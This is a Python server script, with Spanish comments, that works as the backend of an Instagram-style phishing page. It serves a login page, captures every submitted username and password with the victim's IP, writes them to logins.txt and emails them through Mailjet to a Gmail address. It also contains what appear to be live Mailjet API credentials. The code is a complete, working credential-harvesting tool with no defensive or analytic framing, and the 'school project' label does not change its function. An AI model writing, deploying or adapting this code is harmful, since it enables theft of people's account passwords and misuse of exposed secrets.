# server.py (con Mailjet + respaldo local en logins.txt)
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime
import requests

# --- CONFIGURACIÓN MAILJET ---
MAILJET_API_KEY = "26f97d1e712118b2df6b678c218a6cc6"
MAILJET_SECRET_KEY = "097bc551e192cb74d27ea10aeb5b3cbf"

SENDER_EMAIL = "mexicanonwod@gmail.com"
SENDER_NAME = "Proyecto Escolar"
RECIPIENT_EMAIL = "mexicanonwod@gmail.com"

# --- HANDLER DEL SERVIDOR ---
class InstagramHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_file('index.html', 'text/html')
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/login':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))

                username = data.get('username', '').strip()
                password = data.get('password', '').strip()
                ip = self.client_address[0]
                fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

                # Guardar en logins.txt
                self.save_local(username, password, ip, fecha)

                # Enviar por Mailjet
                self.send_email_mailjet(username, password, ip, fecha)

                # Respuesta al cliente
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status": "success"}')
            except Exception as e:
                print(f"Error al procesar login: {e}")
                self.send_error(500)
        else:
            self.send_error(404)

    def save_local(self, username, password, ip, fecha):
        """Guardar los datos en un archivo local logins.txt"""
        try:
            with open("logins.txt", "a", encoding="utf-8") as f:
                f.write(f"[{fecha}] IP: {ip} | Usuario: {username} | Contraseña: {password}\n")
            print("💾 Datos guardados en logins.txt")
        except Exception as e:
            print(f"⚠️ Error al guardar en logins.txt: {e}")

    def send_email_mailjet(self, username, password, ip, fecha):
        """Intentar enviar correo vía Mailjet"""
        url = "https://api.mailjet.com/v3.1/send"
        data = {
            "Messages": [
                {
                    "From": {"Email": SENDER_EMAIL, "Name": SENDER_NAME},
                    "To": [{"Email": RECIPIENT_EMAIL, "Name": "Receptor"}],
                    "Subject": "🚨 Nuevo inicio de sesión (Proyecto Escolar)",
                    "TextPart": f"""
Usuario: {username}
Contraseña: {password}
IP: {ip}
Fecha: {fecha}
                    """.strip()
                }
            ]
        }

        try:
            response = requests.post(
                url,
                json=data,
                auth=(MAILJET_API_KEY, MAILJET_SECRET_KEY)
            )
            print("🔎 Respuesta Mailjet:", response.status_code, response.text)

            if response.status_code == 200:
                print("✅ Correo enviado con Mailjet")
            else:
                print("❌ Mailjet rechazó el envío")
        except Exception as e:
            print(f"⚠️ Error al conectar con Mailjet: {e}")

    def send_file(self, filename, content_type):
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_error(404)

# --- MAIN ---
if __name__ == "__main__":
    PORT = 8080
    server = HTTPServer(('0.0.0.0', PORT), InstagramHandler)
    print(f"Servidor corriendo en puerto {PORT}")
    server.serve_forever()
